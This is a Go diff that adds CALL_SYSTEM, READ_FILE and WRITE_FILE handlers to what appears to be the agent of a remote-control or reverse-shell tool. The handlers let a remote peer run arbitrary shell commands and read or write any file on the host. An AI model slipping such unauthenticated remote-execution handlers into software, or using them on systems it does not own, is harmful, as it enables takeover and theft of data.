@@ -6,6 +6,7 @@ import (
 	"encoding/gob"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"math/rand"
 	"net"
 	"os"
@@ -539,6 +540,56 @@ func handleConnection(c *Client) {
 				c.EncoderLock.Unlock()
 				socks5ServerListener = nil
 			}
+		case message.CALL_SYSTEM:
+			token := msg.Body.(*message.BodyCallSystem).Token
+			command := msg.Body.(*message.BodyCallSystem).Command
+			result, err := exec.Command("sh", "-c", command).Output()
+			if err != nil {
+				result = []byte("")
+			}
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.CALL_SYSTEM_RESULT,
+				Body: message.BodyCallSystemResult{
+					Token:  token,
+					Result: result,
+				},
+			})
+			c.EncoderLock.Unlock()
+		case message.READ_FILE:
+			token := msg.Body.(*message.BodyReadFile).Token
+			path := msg.Body.(*message.BodyReadFile).Path
+			content, err := ioutil.ReadFile(path)
+			if err != nil {
+				content = []byte("")
+			}
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.READ_FILE_RESULT,
+				Body: message.BodyReadFileResult{
+					Token:  token,
+					Result: content,
+				},
+			})
+			c.EncoderLock.Unlock()
+		case message.WRITE_FILE:
+			token := msg.Body.(*message.BodyWriteFile).Token
+			path := msg.Body.(*message.BodyWriteFile).Path
+			content := msg.Body.(*message.BodyWriteFile).Content
+			err := ioutil.WriteFile(path, content, 0644)
+			n := len(content)
+			if err != nil {
+				n = -1
+			}
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.WRITE_FILE_RESULT,
+				Body: message.BodyWriteFileResult{
+					Token: token,
+					N:     n,
+				},
+			})
+			c.EncoderLock.Unlock()
 		}
 	}
 }
